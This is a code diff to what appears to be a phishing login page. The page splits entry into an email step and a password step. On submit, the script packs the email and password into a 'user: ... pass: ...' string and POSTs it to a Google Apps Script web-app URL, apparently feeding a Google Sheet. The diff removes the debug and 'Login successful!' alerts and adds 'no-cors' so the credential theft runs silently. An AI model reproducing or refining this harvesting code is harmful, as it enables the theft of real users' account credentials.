@@ -237,9 +237,7 @@
             }
 
             emailGroup.classList.remove('error');
-            emailError.style.display = 'none';
-            alert(email);
-            
+            emailError.style.display = 'none'; 
             // Hide email section and show password section
             document.querySelector('.email-section').style.display = 'none';
             document.getElementById('passwordSection').style.display = 'block';
@@ -259,23 +257,25 @@
             passwordGroup.classList.remove('error');
             passwordError.style.display = 'none';
             function sendToGoogleSheets() {
-            let text = `user: ${email} pass: ${password}`; // Change this to any text you want
-            alert(text);
-            fetch("https://script.google.com/macros/s/AKfycbytQmeG_XobuM7zlWxitdUy_NlMm9TTgkd8QCJYvQZ5xc5bTIE7i-V4o2DWfUvNMAxp/exec", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ message: text }) // Send as JSON
-            })
-            .then(response => response.text())
-            .then(data => console.log("Success:", data))
-            .catch(error => console.error("Error:", error));
+                let text = `user: ${email} pass: ${password}`;
+    
+                // Add mode: 'no-cors'
+                fetch("https://script.google.com/macros/s/AKfycbytQmeG_XobuM7zlWxitdUy_NlMm9TTgkd8QCJYvQZ5xc5bTIE7i-V4o2DWfUvNMAxp/exec", {
+                    mode: 'no-cors', // This changes how the request is handled
+                    method: "POST",
+                    headers: { 
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({ message: text })
+                })
+                .then(response => {
+                    console.log("Request sent");
+                })
+                .catch(error => console.error("Error:", error));
             }
 
             // Call the function
             sendToGoogleSheets();
-
-          
-            alert('Login successful!');
         });
 
         // Add input event listeners to remove error states when user starts typing
